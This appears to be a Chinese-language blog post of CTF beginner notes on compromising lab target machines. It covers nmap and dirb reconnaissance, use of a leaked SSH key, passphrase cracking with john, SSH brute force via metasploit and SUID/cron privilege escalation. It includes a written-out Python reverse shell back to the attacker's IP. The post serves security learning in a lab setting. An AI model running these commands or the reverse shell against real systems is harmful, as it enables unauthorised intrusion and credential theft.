---
title: CTF学习入门：基本知识
copyright: true
tags: ctf
categories: ctf
abbrlink: f3c1f5a8
date: 2019-10-13 19:47:20
---
基本知识
<!--more-->
#### 挖掘越权漏洞
确定关键可控参数，坚持参数同变同控原则。
* 水平越权 基于身份id、属性id(地址)
* 垂直越权  

##### 主机和靶机环境搭建
**探测靶场IP**
使用netdiscover -r ip/netmask
例如： netdiscover -r 192.168.253.1/24
**比赛方式**
1. 给予在同一局域网中的攻击机和靶场机器，以web方式可以访问攻击机，通过攻击机来渗透靶场机器，获取
获取对应的flag值。
2. 给予一个网线接口，用户自备工具，直接连接网线，进行渗透靶场机器，获取对应的flag值

> 信息探测：对服务的漏洞探测，然后进行对应的数据包发送，获取机器的最高权限。
nmap -sV ip

> 每一个服务对应计算机的一个端口，用来进行通信。

**探测大端口的信息**
1. http://ip:port/
2. 查看源代码获取对应信息。
3. 对这个服务的隐藏文件进行探测  **dirb http://ip:port/**

> robots.txt 存放不允许搜索探测的文件名和允许探测的文件名

> ssh私钥泄露：如何从外部进入最终主机，获取flag 浏览器输入：ip/.ssh/id_rsa 
有authorized_keys id_rsa 文件，通过authorized_keys查看用户名
1. 下载到本地后 ls -alh 查看权限
2. ssh -i id_rsa simon@ip
3. chmod 600 id_rsa
4. ls -alh
5. ssh -i id_rsa simon@ip
输入密码：

**解密ssh密钥信息**
使用ssh2john 将id_rsa密钥信息转换为john可以识别的信息。
chmod 600 id_rsa
**ssh2john id_rsa > rsacrack** 

利用字典解密rsacrack信息
**zcat /usr/share/wordlists/rockyou.txt.gz| john --pipe --rules rsacrack**

ssh -i id_rsa simon@ip

**分析用户名、利用ssh登录服务器**

查找具有root权限的文件
**find / -perm -4000 2 > /dev/null**

根据代码审计结果，得到flag，以及提升权限
cat read_message.c
* 尝试溢出操作
read_message
pwd
whoami
cat flag.txt

##### ssh 协议
1. Secure Shell 缩写。
2. 建立在应用层基础上的安全协议。
3. 利用SSH协议可以有效防止远程管理过程中的信息泄露问题。
4. 基于TCP 22号端口的服务。
 **SSH协议认证机制**
* 基于口令的安全验证 账号和口令
   基于字典的暴力破解，破解对应用户名和密码。
  
* 基于密钥的安全验证 公钥、私钥
   通过对主机信息收集，获取到泄露的用户名和对应的密钥。
   chmod 600 id_rsa
   ssh -i id_rsa 用户名@主机地址 登陆服务器。


__实验环境:__
攻击机： 192.168.1.105
靶场机： 192.168.1.106

1. 信息探测
    对于给定的靶场机器，对其进行渗透测试，先考虑靶场机器开放的服务

    探测把靶场开放的服务与服务的版本
        nmap -sV 靶场ip
    探测靶场全部信息 
        nmap -A -v 靶场IP
    探测靶场的操作系统类型与版本
        nmap -O 靶场IP
```
nmap -sV 192.168.1.106
nmap -A -v 192.168.1.106
nmap -O 192.168.1.106
```
2. 分析探测结果
对于SSH服务的22端口靶场
首先考虑：
   1. 暴力破解
   2. 私钥泄露(私钥中有没有对应密码，是否可以找到私钥的用户名)
对于开放http服务的80端口或者其他端口的靶场
首先考虑：
   1. 通过浏览器访问对应的靶场http服务，如http://靶场ip地址：http服务端口
   2. 使用探测工具对http的目录进行探测，如dirb http://靶场ip地址：http服务端口

> 特别注意 大于1024的端口

3. 挖掘敏感信息
使用浏览器对靶场Ip的http服务探测，对页面中展示的内容也要注意，尤其是联系人等信息(有可能就是ssh的用户名信息)，
递归访问，力争把每一个dirb扫描到的目录页面都访问查看。

尤其是对robots.txt，挖掘具备利用价值的信息。

对某些靶场，可以使用nikto扫描器来挖掘敏感信息。
> 特别注意config等特殊敏感文件，要细读扫描的结果，挖掘可以利用的信息。
`
nikto -host 靶场IP  192.168.1.106
`

利用敏感、弱点信息
对挖掘的ssh密钥利用
1. 修改id_rsa的权限
chmod 600 id_rsa
2. 利用私钥登录服务器
ssh -i id_rsa 用户名@靶场Ip地址

` wget "http://192.168.1.106/icons/VDSDSF.txt" `

扩大战果权限：
1. 查看当前用户whoami
2. id 查看当前用户权限
3. 查看根目录 寻找flag文件

常用命令
```
cat /etc/passwd 查看所有用户的列表
cat /etc/group 查看用户组
find / -user 用户名   查看属于某些用户的文件
/tmp 查看缓冲文件目录
```

深入挖掘：
通过/etc/crontab 文件，设定系统定期执行的任务，编辑，需要root
权限，不同的用户都可以有不同的定时任务。

cat /etc/crontab 挖掘其他用户是否由定时任务，并查看对应的任务内容。
执行的任务对应靶场机器的某个文件。

如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个
定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。


反弹shell
```
#!/usr/bin/python
import os,subprocess,socket  

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("攻击机ip","攻击机监听端口"))0
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

攻击机netcat命令
nc -lpv 未占用端口

查看占用端口
   netstat -pantu


```
   netstat -pantu
   nc -lpv 未占用端口
   

```

深入挖掘：
目标：寻找可以root靶场机器的方式

su -root

查看用户 whoami
查看对应权限 id

切换到/home/用户名 目录查看是否具有可以提升root权限的文件

对ssh服务暴力破解，工具：hydra,medusa等。


利用cupp创建字典
```
git clone https://github.com/jeanphorn/common-password.git
chmod +x cuppy.py
./cuppy.py -i
```


使用metasploit破解SSH
在终端中输入:
```
  msfconsole
    use auxiliary/scanner/ssh/ssh_login
    show options
    set rhosts 192.168.1.106
    set username hadi
    set pass_file /root/Desktop/common-password/hadi.txt
    set verbose true
    run


    set password hadi123
 ```
 优化会话：
 ```
 python -c "import pty;pty.spawn('/bin/bash')"
 su -root
```

### SMB信息泄露
SMB(Server Message Block) 通信协议 主要作为microsoft网络的通讯协议

一般端口使用为139，445

针对SMB协议弱点分析
1. 针对SMB协议，使用空口令，若口令尝试登录，并查看敏感文件，下载查看：
  ```
  smbclient -L ip
  smbclient '\\ip\print$'
  smbclient '\\ip\share$'
  get 敏感文件
  ```
2. 针对SMB协议远程溢出漏洞进行分析
  searchsploit samba版本号

  shodan

  